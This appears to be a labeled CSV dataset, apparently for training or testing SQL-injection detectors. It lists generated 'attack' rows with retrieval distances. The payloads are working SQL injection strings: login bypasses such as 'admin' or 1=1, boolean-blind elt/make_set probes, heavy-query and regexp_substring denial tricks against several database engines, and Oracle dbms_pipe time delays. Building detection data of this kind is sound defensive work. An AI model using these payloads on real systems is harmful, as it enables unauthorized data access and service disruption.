id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000280,attack,boolean,"1'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'qtni'  =  'qtni",nearest_attack_euclidean,R003028,6.130496794153155
GAN_000281,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,6.466745033567016
GAN_000282,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'njnr'  =  'njnr",nearest_attack_euclidean,R000294,7.603533435401605
GAN_000283,attack,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",nearest_attack_euclidean,R003214,4.957853132367096
GAN_000284,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and ""xcjt""  =  ""xcjt",nearest_attack_euclidean,R000332,5.5502706978798555
GAN_000285,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,6.675668573949065
GAN_000286,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex'  =  'kiex",nearest_attack_euclidean,R001903,8.250562704985414
GAN_000287,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R001662,4.875350158710356
GAN_000288,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R001744,3.8264234562351622
GAN_000289,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kbkz'  =  'kbkz",nearest_attack_euclidean,R001474,7.187578739000784
GAN_000290,attack,boolean,"1'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'xzcr'  =  'xzcr",nearest_attack_euclidean,R000735,11.252671673221593
GAN_000291,attack,boolean,admin' or 1  =  1,nearest_attack_euclidean,R000131,8.091608359952165
GAN_000292,attack,boolean,"1'   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  'eflk'  =  'eflk",nearest_attack_euclidean,R001252,5.466572079728675
GAN_000293,attack,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",nearest_attack_euclidean,R003214,6.5001135045049
GAN_000294,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,4.419815655500399
GAN_000295,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,4.847813631003452
GAN_000296,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",nearest_attack_euclidean,R002426,7.889784670621054
GAN_000297,attack,boolean,"admin"" or 1  =  1",nearest_attack_euclidean,R000073,7.612147489681708
GAN_000298,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,4.823391925292817
GAN_000299,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,5.065492850770425
GAN_000300,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kbkz'  =  'kbkz",nearest_attack_euclidean,R001474,9.920113053830848
GAN_000301,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R001662,6.093140603679639
GAN_000302,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'qjle'  =  'qjle",nearest_attack_euclidean,R003119,8.510955742695113
GAN_000303,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R001744,4.129316469769055
GAN_000304,attack,boolean,"1""  )   and elt  (  6651  =  1172,1172  )   and   (  ""zfkb"" like ""zfkb",nearest_attack_euclidean,R001073,6.616491508340277
GAN_000305,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,4.882032502339774
GAN_000306,attack,boolean,"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'csmu'  =  'csmu",nearest_attack_euclidean,R003109,4.378433504649503
GAN_000307,attack,boolean,"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba",nearest_attack_euclidean,R001278,5.667029616169453
GAN_000308,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R001744,4.196278687931841
GAN_000309,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kbkz'  =  'kbkz",nearest_attack_euclidean,R001474,6.655910271164897
GAN_000310,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R001032,5.375567124381604
GAN_000311,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,9.457249582884781
GAN_000312,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex'  =  'kiex",nearest_attack_euclidean,R001903,6.9976444536332805
GAN_000313,attack,boolean,1' and 7533  =  7533 and 'clqy' like 'clqy,nearest_attack_euclidean,R002193,7.572403800762906
GAN_000314,attack,boolean,1'  )   and 7290  =  8416 and   (  'ktlz' like 'ktlz,nearest_attack_euclidean,R001000,7.153614663318672
GAN_000315,attack,boolean,"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'ofko'  =  'ofko",nearest_attack_euclidean,R000502,5.495500662452337
GAN_000316,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R001744,4.67833035850299
GAN_000317,attack,boolean,"or username like char  (  37  )  ,",nearest_attack_euclidean,R000064,8.867603565460861
GAN_000318,attack,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",nearest_attack_euclidean,R003214,5.7114410517762835
GAN_000319,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R001744,4.470691900683279
GAN_000320,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R002873,10.273100111704919
GAN_000321,attack,boolean,"1'   )    )     )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'ofko'  =  'ofko",nearest_attack_euclidean,R000502,5.120173737255259
GAN_000322,attack,boolean,"1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'dbsm'  =  'dbsm",nearest_attack_euclidean,R003427,7.71728463115534
GAN_000323,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'wusq'  =  'wusq",nearest_attack_euclidean,R000818,6.700202202389021
GAN_000324,attack,boolean,"1"" and 7533  =  7533 and ""btak"" like ""btak",nearest_attack_euclidean,R003249,8.270999801344065
GAN_000325,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,5.585333779937404
GAN_000326,attack,boolean,"1'   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  'kgdt' like 'kgdt",nearest_attack_euclidean,R002426,7.934162644146808
GAN_000327,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R001032,4.656934981025955
GAN_000328,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,6.817188026449036
GAN_000329,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,5.438694831448042
GAN_000330,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R002706,4.970506724481877
GAN_000331,attack,boolean,"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'ifca' like 'ifca",nearest_attack_euclidean,R003388,4.762976865812833
GAN_000332,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'btnl'  =  'btnl",nearest_attack_euclidean,R003179,7.428065653638499
GAN_000333,attack,boolean,"1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'dbsm'  =  'dbsm",nearest_attack_euclidean,R003427,5.29968329197521
GAN_000334,attack,boolean,-2823'   )    )    or 5663  =  4228 and    (    (   'skgh' like 'skgh,nearest_attack_euclidean,R001882,5.6084632585016045
GAN_000335,attack,boolean,"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba",nearest_attack_euclidean,R001278,5.036951663626991
GAN_000336,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,7.6058468398362695
GAN_000337,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and ""xcjt""  =  ""xcjt",nearest_attack_euclidean,R000332,5.563499694410168
GAN_000338,attack,boolean,"1'   )    )    and make_set  (  3793  =  8118,8118  )   and    (    (   'swvc' like 'swvc",nearest_attack_euclidean,R003518,5.572009820169501
GAN_000339,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,7.933589501662047
GAN_000340,attack,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",nearest_attack_euclidean,R003214,6.3541203787035885
GAN_000341,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,6.0257218973825015
GAN_000342,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R002873,7.616855199064847
GAN_000343,attack,boolean,"1""  )   and 4760  =  2922",nearest_attack_euclidean,R001531,10.044727203117645
GAN_000344,attack,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",nearest_attack_euclidean,R003214,7.80633820043545
GAN_000345,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,3.9395448491723917
GAN_000346,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R001032,4.7350370802446555
GAN_000347,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,7.064779905140334
GAN_000348,attack,boolean,admin' or 1  =  1--,nearest_attack_euclidean,R000259,11.053912730520643
GAN_000349,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R001662,5.952877848150723
GAN_000350,attack,boolean,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",nearest_attack_euclidean,R000593,7.363555457839879
GAN_000351,attack,boolean,"1' and make_set  (  4952  =  7129,7129  )  ",nearest_attack_euclidean,R002575,6.861947397796828
GAN_000352,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,9.659455526835847
GAN_000353,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'nmat' like 'nmat",nearest_attack_euclidean,R001521,8.212732530412225
GAN_000354,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,5.62582454578089
GAN_000355,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,3.9205797714755377
GAN_000356,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R001032,4.451488146653037
GAN_000357,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,6.3116401214302185
GAN_000358,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'btnl'  =  'btnl",nearest_attack_euclidean,R003179,6.7655951334825355
GAN_000359,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex'  =  'kiex",nearest_attack_euclidean,R001903,10.1412736799054
GAN_000360,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R002706,4.709701459167873
GAN_000361,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,8.538565995410137
GAN_000362,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'cewn'  =  'cewn",nearest_attack_euclidean,R001032,4.990848236434085
GAN_000363,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,5.464844548229392
GAN_000364,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'tfso'  =  'tfso",nearest_attack_euclidean,R001810,6.428767162095399
GAN_000365,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,8.551221302111719
GAN_000366,attack,boolean,"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'vunt'  =  'vunt",nearest_attack_euclidean,R003360,7.4427073278005755
GAN_000367,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'pczr'  =  'pczr",nearest_attack_euclidean,R002475,5.1023949157758945
GAN_000368,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R001744,3.8569650015482906
GAN_000369,attack,boolean,"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'wcmt'  =  'wcmt",nearest_attack_euclidean,R003214,4.982483720270024
GAN_000370,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",nearest_attack_euclidean,R002746,5.430602179202516
GAN_000371,attack,boolean,"1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  'dbsm'  =  'dbsm",nearest_attack_euclidean,R003427,8.282865919875176
GAN_000372,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R002873,8.529312969267052
GAN_000373,attack,boolean,"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'vunt'  =  'vunt",nearest_attack_euclidean,R003360,6.629658577932997
GAN_000374,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,6.348469852215522
GAN_000375,attack,boolean,"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'ifca' like 'ifca",nearest_attack_euclidean,R003388,5.732611334772653
GAN_000376,attack,boolean,"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'ifca' like 'ifca",nearest_attack_euclidean,R003388,7.434632304820601
GAN_000377,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'pczr'  =  'pczr",nearest_attack_euclidean,R002475,6.29912626124385
GAN_000378,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,6.979688544716597
GAN_000379,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,10.344668109367403
GAN_000380,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,5.0582972475008985
GAN_000381,attack,boolean,"1'   )    )     )   and make_set  (  6094  =  2929,2929  )   and    (    (     (  'gkyo'  =  'gkyo",nearest_attack_euclidean,R001751,6.108074369465307
GAN_000382,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,5.3788610808785045
GAN_000383,attack,boolean,"1'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'qtni'  =  'qtni",nearest_attack_euclidean,R003028,6.30441034001266
GAN_000384,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf'  =  'osqf",nearest_attack_euclidean,R002873,9.008736913955737
GAN_000385,attack,boolean,"-7802'   )    )     )   or elt  (  8778  =  9974,9974  )   and    (    (     (  'glsq' like 'glsq",nearest_attack_euclidean,R002405,5.873933415399208
GAN_000386,attack,boolean,"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'miba'  =  'miba",nearest_attack_euclidean,R001278,6.179386177027254
GAN_000387,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,4.037912896231298
GAN_000388,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R001662,6.696331780937616
GAN_000389,attack,boolean,"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'vunt'  =  'vunt",nearest_attack_euclidean,R003360,6.136337907670051
GAN_000390,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,5.926983156087437
GAN_000391,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,6.619571262137779
GAN_000392,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,9.71160283995008
GAN_000393,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R001744,4.587314558934798
GAN_000394,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R001662,6.3834096991774585
GAN_000395,attack,boolean,"-2149""   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  ""hoon"" like ""hoon",nearest_attack_euclidean,R003468,5.039377095440019
GAN_000396,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R001744,4.1665034783607355
GAN_000397,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gsup'  =  'gsup",nearest_attack_euclidean,R002271,7.505851527312425
GAN_000398,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R002706,5.25220804909548
GAN_000399,attack,boolean,"-3729'   )    )    or elt  (  4482  =  2648,2648  )   and    (    (   'vkkr' like 'vkkr",nearest_attack_euclidean,R003434,5.810683134873078
GAN_000400,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,7.416105835366274
GAN_000401,attack,boolean,1'  )   and 7533  =  7533 and   (  'xyga' like 'xyga,nearest_attack_euclidean,R002946,6.458537829648139
GAN_000402,attack,boolean,"1'   )    )    and elt  (  3053  =  9778,9778  )   and    (    (   'yfaa' like 'yfaa",nearest_attack_euclidean,R001662,5.790739883426682
GAN_000403,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""tbcc""  =  ""tbcc",nearest_attack_euclidean,R002445,5.643287145820618
GAN_000404,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,5.998309461301429
GAN_000405,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R002706,4.290930585549623
GAN_000406,attack,boolean,"-3729'   )    )    or elt  (  4482  =  2648,2648  )   and    (    (   'vkkr' like 'vkkr",nearest_attack_euclidean,R003434,5.410380091590917
GAN_000407,attack,boolean,"1'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  'cenk'  =  'cenk",nearest_attack_euclidean,R001268,8.658329447640492
GAN_000408,attack,boolean,1' and non_existant_table   =   '1,nearest_attack_euclidean,R000138,9.609209820412907
GAN_000409,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'wusq'  =  'wusq",nearest_attack_euclidean,R000818,6.062527142978948
GAN_000410,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and 'dfwj'  =  'dfwj",nearest_attack_euclidean,R000763,6.9938455395845835
GAN_000411,attack,boolean,"1'  )   and elt  (  4249  =  4249,7259  )   and   (  'ifca' like 'ifca",nearest_attack_euclidean,R003388,7.64720395292883
GAN_000412,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'nmat' like 'nmat",nearest_attack_euclidean,R001521,11.541846574857612
GAN_000413,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'btnl'  =  'btnl",nearest_attack_euclidean,R003179,8.302799609956418
GAN_000414,attack,boolean,"-3729'   )    )    or elt  (  4482  =  2648,2648  )   and    (    (   'vkkr' like 'vkkr",nearest_attack_euclidean,R003434,4.390103628488999
GAN_000415,attack,boolean,"1'   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'brlc'  =  'brlc",nearest_attack_euclidean,R001040,7.724881966042771
GAN_000416,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'pczr'  =  'pczr",nearest_attack_euclidean,R002475,4.690774548067281
